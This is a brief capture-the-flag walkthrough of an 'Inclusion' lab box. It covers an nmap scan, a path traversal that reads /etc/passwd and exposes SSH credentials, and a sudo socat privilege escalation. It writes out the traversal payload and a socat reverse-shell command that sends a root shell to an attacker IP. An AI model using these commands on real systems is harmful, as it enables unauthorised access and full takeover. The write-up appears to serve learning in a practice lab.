# Inclusion.


````
export IP=10.10.180.242
````

# Task 1

1. No answer needed

# Task 2

1. user flag

````
# Nmap 7.91 scan initiated Sun Mar 21 16:22:27 2021 as: nmap -sC -sV -oN nmapscan 10.10.180.242
Nmap scan report for 10.10.180.242
Host is up (0.33s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-title: My blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar 21 16:23:36 2021 -- 1 IP address (1 host up) scanned in 68.86 seconds

````
````
We can perform dir traversal using the ../../../etc/passwd.
This yields a rather interesting rest: #falconfeast:rootpassword

Port 22 is open, we can then ssh using these obtained creds and attempt to privesc to get a root shell.

once we have ssh'd, we cat jus cat the user.txt file to obtain the user flag.

```


2. root flag

# Privesc

````
sudo -l to check what we can run without root passwd.

User falconfeast may run the following commands on inclusion:
(root) NOPASSWD: /usr/bin/socat

Head over to GTFO bins to find a command for exploiting this privesc vector

socat stdin exec:/bin/sh

Reverse shell
It can send back a reverse shell to a listening attacker to open a remote network access.

Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.

sudo socat tcp-connect:10.6.31.50:9999 exec:/bin/sh,pty,stderr,setsid,sigint,sane

cd /root

cat root.txt

submit the flag.

````

